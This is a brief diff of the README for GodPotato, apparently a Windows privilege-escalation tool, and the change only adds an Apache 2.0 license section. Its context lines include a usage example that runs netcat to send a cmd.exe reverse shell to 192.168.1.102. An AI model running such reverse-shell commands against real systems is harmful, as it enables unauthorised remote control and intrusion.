@@ -75,3 +75,8 @@ Execute reverse shell commands
 ```
 GodPotato -clsid {4991d34b-80a1-4291-83b6-3328366b9097} -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 ```
+
+
+# License
+
+[Apache License 2.0](/LICENSE) 
